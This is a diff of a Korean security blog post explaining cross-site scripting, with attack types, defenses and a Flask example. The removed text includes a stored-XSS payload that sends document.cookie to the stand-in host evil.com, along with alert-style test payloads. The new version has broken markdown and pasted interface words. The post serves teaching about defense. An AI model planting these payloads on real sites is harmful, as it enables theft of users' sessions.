@@ -1,86 +1,72 @@
 ---
 layout: post
-title:  XSS 취약점
-date:   2025-06-19
-category: security
+title:  웹 취약점: XSS(Cross-Site Scripting) 제대로 알기
+date:   2024-06-19
+category: Web Security
 image: assets/img/blog/image.png
 author: 최진혁
-tags: xss, web-security
+tags:
+  - 웹보안
+  - XSS
+  - 해킹
 ---
 
-### XSS란 무엇일까요?
-
-* **정의:** XSS(Cross-Site Scripting)는 웹 페이지에 사용자가 입력한 내용을 필터링 없이 그대로 출력할 때, 공격자가 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행되도록 하는 취약점입니다.
-* **영향:**  
-    * **쿠키·세션 탈취:** `document.cookie` 등을 통해 인증 정보가 외부로 전송될 수 있습니다.  
-    * **피싱·UI 변조:** 페이지 내용을 조작해 가짜 로그인 폼이나 입력창을 띄울 수 있습니다.  
-    * **권한 상승:** 악성 스크립트를 통해 관리자 기능을 탈취하거나 실행할 수 있습니다.
-
----
-
-## 2. XSS의 유형
-
-1. **Stored XSS (영구형):**  
-   공격 코드를 데이터베이스, 게시판, 댓글 등에 저장해 다른 사용자가 접근할 때마다 실행되도록 함.  
-2. **Reflected XSS (반사형):**  
-   URL 파라미터나 폼 입력값에 공격 코드를 넣으면 즉시 응답 페이지에 반영되어 실행됨.  
-3. **DOM-Based XSS:**  
-   클라이언트 측 자바스크립트에서 `innerHTML`, `document.write` 등을 통해 동적으로 삽입 시 발생.
+XSS(Cross-Site Scripting, 이하 XSS)는 사용자의 입력값이 웹 페이지에 그대로 출력될 때 발생하는 대표적인 웹 취약점입니다.  
+이 취약점을 통해 공격자는 악성 스크립트를 삽입하고, 사용자의 쿠키 탈취, 세션 하이재킹 등 다양한 공격을 시도할 수 있습니다.
 
 ---
 
-## 3. 공격 시나리오
+## XSS란?
 
-- **Stored XSS 예시:**  
-  게시판에 `<script>new Image().src="https://evil.com/steal?c="+encodeURIComponent(document.cookie)</script>` 를 남기면, 모든 방문자가 쿠키를 탈취당함.
-- **Reflected XSS 예시:**  
-  `https://victim.com/search?q=<script>alert('XSS')</script>` 링크를 열 때마다 스크립트가 즉시 실행됨.
-- **DOM-Based XSS 예시:**  
-  `document.getElementById('output').innerHTML = location.hash.substring(1);` 코드가 `<div id="output">`에 해시값을 그대로 출력.
+XSS는 공격자가 웹사이트에 악성 JavaScript 코드를 주입해  
+다른 사용자의 브라우저에서 해당 스크립트가 실행되도록 하는 공격입니다.
 
----
-
-## 4. 방어 방법
-
-1. **출력 시 이스케이프 처리**  
-   모든 사용자 입력값을 HTML 특수문자로 변환(`&lt;`, `&gt;`, `&quot;`, `&#x27;` 등).
-2. **Content Security Policy (CSP) 적용**  
-   인라인 스크립트나 외부 스크립트 로딩을 엄격히 제한.
-3. **HTTPOnly & Secure 쿠키**  
-   `document.cookie` 접근을 차단하고 HTTPS 전송만 허용.
-4. **라이브러리 활용**  
-   React/Vue 같은 프레임워크의 자동 이스케이프 기능 또는 OWASP ESAPI 사용.
-
----
-
-## 5. 예시 코드 (Flask + Jinja2)
+예를 들어, 아래와 같이 사용자의 입력값을 필터링 없이 출력하는 코드가 있다고 가정해봅시다.
 
 ```python
-# 취약한 코드: 필터링 없이 바로 출력
 @app.route('/search')
 def search():
     query = request.args.get('q')
-    return f"<h1>검색 결과: {query}</h1>"
+    return f"검색 결과: {query}"
+여기서 입력값에
 
-# 안전한 코드: Jinja2 자동 이스케이프 활용
-@app.route('/search-safe')
-def search_safe():
-    query = request.args.get('q')
-    return render_template('search.html', query=query)
-```
+php-template
+복사
+편집
+<script>alert('XSS!')</script>
+를 넣으면, 해당 스크립트가 그대로 실행됩니다.
+이로 인해 사용자 쿠키 탈취, 피싱 등 다양한 피해가 발생할 수 있습니다.
 
-```html
-<!-- templates/search.html -->
-<!DOCTYPE html>
-<html>
-  <head><meta charset="utf-8"><title>검색</title></head>
-  <body>
-    <h1>검색 결과: {{ query }}</h1>
-  </body>
-</html>
-```
+실제 공격 시나리오
+쿠키/세션 탈취: document.cookie를 통해 인증정보를 공격자 서버로 전송
 
----
+웹사이트 변조: DOM 조작, 가짜 입력창 생성 등
 
-XSS는 단순하지만 가장 흔하게 발견되는 취약점 중 하나입니다.  
-작은 실수 한 번이 큰 보안 사고로 이어질 수 있으니, 언제나 입력값을 믿지 말고 “출력 시 반드시 이스케이프!”를 기억하세요.  
+사용자 권한 탈취 및 피싱
+
+방어 방법
+입력값 출력 시 HTML 이스케이프 처리
+(<, >, ", ', & 등 특수문자를 변환)
+
+HTTPOnly 쿠키 사용
+JavaScript로 접근 불가능하게 쿠키 설정
+
+Content Security Policy(CSP) 적용
+외부 스크립트, 인라인 스크립트 제한
+
+XSS는 "출력 시 반드시 이스케이프!"
+보안의 기본은 사용자 입력값을 신뢰하지 않는 것입니다.
+
+예시 코드 (Flask Jinja2)
+python
+복사
+편집
+# 취약한 코드
+return f"검색 결과: {query}"
+
+# 안전한 코드 (자동 이스케이프 적용)
+return render_template('search.html', query=query)
+마무리
+XSS는 사용자 데이터를 그대로 출력하는 순간 발생할 수 있습니다.
+단순해 보이지만, 실제 공격에 사용되면 피해가 매우 커질 수 있으니 항상 주의해야 합니다!
+출력 이스케이프, HTTPOnly, CSP 등 기본 원칙을 꼭 지킵시다.
